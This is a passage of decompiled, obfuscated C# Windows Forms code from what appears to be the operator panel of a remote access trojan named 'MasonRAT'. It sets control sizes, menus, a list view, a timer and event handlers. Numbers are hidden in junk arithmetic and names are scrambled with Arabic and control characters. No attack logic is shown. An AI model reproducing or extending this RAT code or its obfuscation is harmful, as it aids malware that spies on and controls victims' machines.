    this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Size = new Size((325560021 ^ 13) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0 - (1061888037 + 177947158 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0) % ((-1014729402 ^ ~168113406) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0 + 0, 39);
    this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.TabIndex = (2118033032 + 1431690373 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0 ^ ~(1101657019 + -356413123 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0;
    this.\u2694️MasonRAT\u270Cڜب\u060Dبـٻـحـــ\u060Cدـٸ\u060Aٺ\u060Aـ\u0608.Anchor = (AnchorStyles) (((1497366532 ^ 928361162 << 1907172245) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0 ^ 1866073759 - 1866073746 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 << 1);
    this.\u2694️MasonRAT\u270Cڜب\u060Dبـٻـحـــ\u060Cدـٸ\u060Aٺ\u060Aـ\u0608.Animated = true;
    this.\u2694️MasonRAT\u270Cڜب\u060Dبـٻـحـــ\u060Cدـٸ\u060Aٺ\u060Aـ\u0608.BackColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cڜب\u060Dبـٻـحـــ\u060Cدـٸ\u060Aٺ\u060Aـ\u0608.ControlBoxType = ControlBoxType.MinimizeBox;
    this.\u2694️MasonRAT\u270Cڜب\u060Dبـٻـحـــ\u060Cدـٸ\u060Aٺ\u060Aـ\u0608.Cursor = Cursors.Hand;
    this.\u2694️MasonRAT\u270Cڜب\u060Dبـٻـحـــ\u060Cدـٸ\u060Aٺ\u060Aـ\u0608.CustomIconSize = 30f;
    this.\u2694️MasonRAT\u270Cڜب\u060Dبـٻـحـــ\u060Cدـٸ\u060Aٺ\u060Aـ\u0608.FillColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cڜب\u060Dبـٻـحـــ\u060Cدـٸ\u060Aٺ\u060Aـ\u0608.HoverState.FillColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cڜب\u060Dبـٻـحـــ\u060Cدـٸ\u060Aٺ\u060Aـ\u0608.HoverState.IconColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cڜب\u060Dبـٻـحـــ\u060Cدـٸ\u060Aٺ\u060Aـ\u0608.IconColor = Color.White;
    this.\u2694️MasonRAT\u270Cڜب\u060Dبـٻـحـــ\u060Cدـٸ\u060Aٺ\u060Aـ\u0608.Location = new Point(((2141705417 + (1169005051 >> 2117575577) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0) > -1617238882 - 1826962372 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0 ? 677830176 - 677829518 % 1360229675 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0 : 1019383351 - 1019382474 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 << 1), 2);
    this.\u2694️MasonRAT\u270Cڜب\u060Dبـٻـحـــ\u060Cدـٸ\u060Aٺ\u060Aـ\u0608.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 254);
    this.\u2694️MasonRAT\u270Cڜب\u060Dبـٻـحـــ\u060Cدـٸ\u060Aٺ\u060Aـ\u0608.PressedColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cڜب\u060Dبـٻـحـــ\u060Cدـٸ\u060Aٺ\u060Aـ\u0608.PressedDepth = 0;
    this.\u2694️MasonRAT\u270Cڜب\u060Dبـٻـحـــ\u060Cدـٸ\u060Aٺ\u060Aـ\u0608.Size = new Size(((1582295523 > 356581985 ? 1942112047 : -1705484567) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0 > ((320839660 ^ 22) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0) ? (-1334012574 ^ -1334012593) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0 : (-784387272 ^ -784387324) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 << 1), 37);
    this.\u2694️MasonRAT\u270Cڜب\u060Dبـٻـحـــ\u060Cدـٸ\u060Aٺ\u060Aـ\u0608.TabIndex = (1512238309 - ~1363793782 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0) - -(1137469521 + 845967309 % 564501611 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 ^ 0;
    this.\u2694️MasonRAT\u270Cڜب\u060Dبـٻـحـــ\u060Cدـٸ\u060Aٺ\u060Aـ\u0608.UseTransparentBackground = true;
    this.\u2694️MasonRAT\u270Cـــٺ\u0608\u060Bئحى\u060B\u060Aۙۙـؤۙڦ.Anchor = (AnchorStyles) ((16157441 + 48843263 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0 > -2130957968 - 166042300 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0 ? (1375711415 ^ (1101344947 | 1350271001)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0 : 1515944812 - 1515944803 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0 + 0);
    this.\u2694️MasonRAT\u270Cـــٺ\u0608\u060Bئحى\u060B\u060Aۙۙـؤۙڦ.Animated = true;
    this.\u2694️MasonRAT\u270Cـــٺ\u0608\u060Bئحى\u060B\u060Aۙۙـؤۙڦ.BackColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cـــٺ\u0608\u060Bئحى\u060B\u060Aۙۙـؤۙڦ.Cursor = Cursors.Hand;
    this.\u2694️MasonRAT\u270Cـــٺ\u0608\u060Bئحى\u060B\u060Aۙۙـؤۙڦ.CustomIconSize = 30f;
    this.\u2694️MasonRAT\u270Cـــٺ\u0608\u060Bئحى\u060B\u060Aۙۙـؤۙڦ.FillColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cـــٺ\u0608\u060Bئحى\u060B\u060Aۙۙـؤۙڦ.HoverState.FillColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cـــٺ\u0608\u060Bئحى\u060B\u060Aۙۙـؤۙڦ.HoverState.IconColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cـــٺ\u0608\u060Bئحى\u060B\u060Aۙۙـؤۙڦ.IconColor = Color.White;
    this.\u2694️MasonRAT\u270Cـــٺ\u0608\u060Bئحى\u060B\u060Aۙۙـؤۙڦ.Location = new Point((((353741451 ^ (1161421882 | 10163668)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0) > 1119138010 + 474426159 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0 ? 598502682 - 598501737 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0 : 1558288681 - 1558287972 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0), 2);
    this.\u2694️MasonRAT\u270Cـــٺ\u0608\u060Bئحى\u060B\u060Aۙۙـؤۙڦ.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, (int) byte.MaxValue);
    this.\u2694️MasonRAT\u270Cـــٺ\u0608\u060Bئحى\u060B\u060Aۙۙـؤۙڦ.PressedColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cـــٺ\u0608\u060Bئحى\u060B\u060Aۙۙـؤۙڦ.PressedDepth = 0;
    this.\u2694️MasonRAT\u270Cـــٺ\u0608\u060Bئحى\u060B\u060Aۙۙـؤۙڦ.Size = new Size((1247921189 ^ 428603529 % 947282301) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0 - (723012985 + 684846854 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 << 1), 37);
    this.\u2694️MasonRAT\u270Cـــٺ\u0608\u060Bئحى\u060B\u060Aۙۙـؤۙڦ.TabIndex = (157905851 + 1519225177 % 655720073 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0) - ((-2130525583 - (1144477916 | 1587733562) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0) << ((947996641 ^ 19) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0);
    this.\u2694️MasonRAT\u270Cـــٺ\u0608\u060Bئحى\u060B\u060Aۙۙـؤۙڦ.UseTransparentBackground = true;
    this.\u2694️MasonRAT\u270Cﻋټـــ\u060Fڅڇـءـۙ\u0608ڙۡ\u060Cٸۧۨ\u0608.DockIndicatorTransparencyValue = 0.6;
    this.\u2694️MasonRAT\u270Cﻋټـــ\u060Fڅڇـءـۙ\u0608ڙۡ\u060Cٸۧۨ\u0608.TargetControl = (Control) this.\u2694️MasonRAT\u270Cۚٺۏڕﻼ\u0608ــڅ\u0609ـ\u060Dــ\u060Bءـ\u060A;
    this.\u2694️MasonRAT\u270Cﻋټـــ\u060Fڅڇـءـۙ\u0608ڙۡ\u060Cٸۧۨ\u0608.UseTransparentDrag = true;
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackColor = Color.Black;
    this.ClientSize = new Size(((538060611 - (153548835 << 390851233) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0) > 1467164405 + 330998694 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0 ? (1019 ^ 6) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0 : 2047496634 - 2047495868 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0 + 0, 630);
    this.Controls.Add((Control) this.\u2694️MasonRAT\u270Cۚٺۏڕﻼ\u0608ــڅ\u0609ـ\u060Dــ\u060Bءـ\u060A);
    this.FormBorderStyle = FormBorderStyle.None;
    this.Icon = (Icon) componentResourceManager.GetObject(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 256 /*0x0100*/));
    this.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 257);
    this.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 258);
    this.\u2694️MasonRAT\u270Cﮪ\u0609ٺةحڇڜْـــ\u060Bڙـٻ.ResumeLayout(false);
    this.\u2694️MasonRAT\u270Cﮪ\u0609ٺةحڇڜْـــ\u060Bڙـٻ.PerformLayout();
    this.\u2694️MasonRAT\u270Cـــﯧ\u060Bـڝ\u060D\u0609\u060C\u060A\u0608ڣد.ResumeLayout(false);
    ((ISupportInitialize) this.\u2694️MasonRAT\u270Cٺ\u060Dۙﻋ\u0609\u0609\u060Cּ\u060Dٽڙءﮪټڟ̍ۙ\u060D\u0608ة).EndInit();
    this.\u2694️MasonRAT\u270Cۚٺۏڕﻼ\u0608ــڅ\u0609ـ\u060Dــ\u060Bءـ\u060A.ResumeLayout(false);
    this.\u2694️MasonRAT\u270Cۚٺۏڕﻼ\u0608ــڅ\u0609ـ\u060Dــ\u060Bءـ\u060A.PerformLayout();
    this.\u2694️MasonRAT\u270Cۙ\u0608ة\u0608\u0608\u060Cﻋ\u0609ــ\u060A\u060Aڕ.ResumeLayout(false);
    this.ResumeLayout(false);
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـڛٽ̨ـڙ\u060F\u060E\u060Aـئﻻ̍ــﻻﻻة\u060A\u0608
  {
    get => this.\u2694️MasonRAT\u270Cڙ\u060Eـۙ̍ـﻋـۡـټ\u060Fۧــؤﻼ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060Dدـ\u060Fﻻ\u060Fبڛمـڙ\u0608ﻼْـْ\u060Aڟـ);
      ToolStripMenuItem ratڙـۙ̍ـﻋـۡـټۧــؤﻼ1 = this.\u2694️MasonRAT\u270Cڙ\u060Eـۙ̍ـﻋـۡـټ\u060Fۧــؤﻼ;
      if (ratڙـۙ̍ـﻋـۡـټۧــؤﻼ1 != null)
        ratڙـۙ̍ـﻋـۡـټۧــؤﻼ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cڙ\u060Eـۙ̍ـﻋـۡـټ\u060Fۧــؤﻼ = value;
      ToolStripMenuItem ratڙـۙ̍ـﻋـۡـټۧــؤﻼ2 = this.\u2694️MasonRAT\u270Cڙ\u060Eـۙ̍ـﻋـۡـټ\u060Fۧــؤﻼ;
      if (ratڙـۙ̍ـﻋـۡـټۧــؤﻼ2 == null)
        return;
      ratڙـۙ̍ـﻋـۡـټۧــؤﻼ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("MenuStrip1")]
  internal virtual MenuStrip \u2694️MasonRAT\u270Cﮪ\u0609ٺةحڇڜْـــ\u060Bڙـٻ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ImageList1")]
  internal virtual ImageList \u2694️MasonRAT\u270Cڦٺـ\u0608\u060Aـمۙﻋـةـۡ\u060Dــڙ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ColumnHeader2")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270C\u0608ــ\u0609\u060Fـــ\u060Cڙڙ\u0020̍\u060F { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ColumnHeader1")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270C\u0608ــح\u0609ڼـڞٸـئژـ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ListView \u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ
  {
    get => this.\u2694️MasonRAT\u270C\u0608ٺ؁ڙـ\u060Eٻڇ\u060Bـڙٸۧـح\u060E\u0608ـ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler1 = new EventHandler(this.\u2694️MasonRAT\u270Cـڠؤۜٸﻼ\u060A\u0608ۚڇ);
      KeyEventHandler keyEventHandler = new KeyEventHandler(this.\u2694️MasonRAT\u270Cژ\u060Bڙ\u0020ــۙ̍\u0609ۙـ);
      EventHandler eventHandler2 = new EventHandler(this.\u2694️MasonRAT\u270Cـڅ\u060Dڦ\u060Bڙى\u0609\u060Dــ\u060Fـڟڙــ\u060D);
      ListView ratٺ؁ڙـٻڇـڙٸۧـحـ1 = this.\u2694️MasonRAT\u270C\u0608ٺ؁ڙـ\u060Eٻڇ\u060Bـڙٸۧـح\u060E\u0608ـ;
      if (ratٺ؁ڙـٻڇـڙٸۧـحـ1 != null)
      {
        ratٺ؁ڙـٻڇـڙٸۧـحـ1.DoubleClick -= eventHandler1;
        ratٺ؁ڙـٻڇـڙٸۧـحـ1.KeyDown -= keyEventHandler;
        ratٺ؁ڙـٻڇـڙٸۧـحـ1.SelectedIndexChanged -= eventHandler2;
      }
      this.\u2694️MasonRAT\u270C\u0608ٺ؁ڙـ\u060Eٻڇ\u060Bـڙٸۧـح\u060E\u0608ـ = value;
      ListView ratٺ؁ڙـٻڇـڙٸۧـحـ2 = this.\u2694️MasonRAT\u270C\u0608ٺ؁ڙـ\u060Eٻڇ\u060Bـڙٸۧـح\u060E\u0608ـ;
      if (ratٺ؁ڙـٻڇـڙٸۧـحـ2 == null)
        return;
      ratٺ؁ڙـٻڇـڙٸۧـحـ2.DoubleClick += eventHandler1;
      ratٺ؁ڙـٻڇـڙٸۧـحـ2.KeyDown += keyEventHandler;
      ratٺ؁ڙـٻڇـڙٸۧـحـ2.SelectedIndexChanged += eventHandler2;
    }
  }

  [field: AccessedThroughProperty("PictureBox1")]
  internal virtual PictureBox \u2694️MasonRAT\u270Cٺ\u060Dۙﻋ\u0609\u0609\u060Cּ\u060Dٽڙءﮪټڟ̍ۙ\u060D\u0608ة { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual Timer \u2694️MasonRAT\u270C\u060Dةـ\u060Fڠۧـڙٺئۙﻋ
  {
    get => this.\u2694️MasonRAT\u270Cڙـدڞﻼژــ\u0609\u0608;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u0609ڙ\u0609\u060Cڙ\u060Dــڜۧ\u0609\u0608\u060Eּـڦـٸ\u060E);
      Timer masonRatڙـدڞﻼژــ1 = this.\u2694️MasonRAT\u270Cڙـدڞﻼژــ\u0609\u0608;
      if (masonRatڙـدڞﻼژــ1 != null)
        masonRatڙـدڞﻼژــ1.Tick -= eventHandler;
      this.\u2694️MasonRAT\u270Cڙـدڞﻼژــ\u0609\u0608 = value;
      Timer masonRatڙـدڞﻼژــ2 = this.\u2694️MasonRAT\u270Cڙـدڞﻼژــ\u0609\u0608;
      if (masonRatڙـدڞﻼژــ2 == null)
        return;
      masonRatڙـدڞﻼژــ2.Tick += eventHandler;
    }
  }

  [field: AccessedThroughProperty("Guna2Elipse1")]
  internal virtual Guna2Elipse \u2694️MasonRAT\u270C\u0608ۙ؁ڣ\u060E\u0609ڙּڙٽ\u060Dــؤڟـ̍ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual Guna2CustomGradientPanel \u2694️MasonRAT\u270Cۚٺۏڕﻼ\u0608ــڅ\u0609ـ\u060Dــ\u060Bءـ\u060A
  {
    get => this.\u2694️MasonRAT\u270C\u060E\u0609̍ۡـۨۚٺـڙ\u060D;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      PaintEventHandler paintEventHandler = new PaintEventHandler(this.\u2694️MasonRAT\u270C\u060Eؤگ\u060Dۙـڛح\u0609ـ\u060Aۚؤڇـ̍ـۡ\u060D);
      Guna2CustomGradientPanel masonRat̍ۡـۨۚٺـڙ1 = this.\u2694️MasonRAT\u270C\u060E\u0609̍ۡـۨۚٺـڙ\u060D;
      if (masonRat̍ۡـۨۚٺـڙ1 != null)
        masonRat̍ۡـۨۚٺـڙ1.Paint -= paintEventHandler;
      this.\u2694️MasonRAT\u270C\u060E\u0609̍ۡـۨۚٺـڙ\u060D = value;
      Guna2CustomGradientPanel masonRat̍ۡـۨۚٺـڙ2 = this.\u2694️MasonRAT\u270C\u060E\u0609̍ۡـۨۚٺـڙ\u060D;
      if (masonRat̍ۡـۨۚٺـڙ2 == null)
        return;
      masonRat̍ۡـۨۚٺـڙ2.Paint += paintEventHandler;
    }
  }

  [field: AccessedThroughProperty("Guna2ControlBox2")]
  internal virtual Guna2ControlBox \u2694️MasonRAT\u270Cڜب\u060Dبـٻـحـــ\u060Cدـٸ\u060Aٺ\u060Aـ\u0608 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("Guna2ControlBox1")]
  internal virtual Guna2ControlBox \u2694️MasonRAT\u270Cـــٺ\u0608\u060Bئحى\u060B\u060Aۙۙـؤۙڦ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("Guna2GroupBox1")]
  internal virtual Guna2GroupBox \u2694️MasonRAT\u270Cۙ\u0608ة\u0608\u0608\u060Cﻋ\u0609ــ\u060A\u060Aڕ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("TextBox1")]
  internal virtual Guna2TextBox \u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("Guna2ResizeBox1")]
  internal virtual Guna2ResizeBox \u2694️MasonRAT\u270Cـ\u0608ټـبؤـ؁\u060Aۏﮪ\u060Cـ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

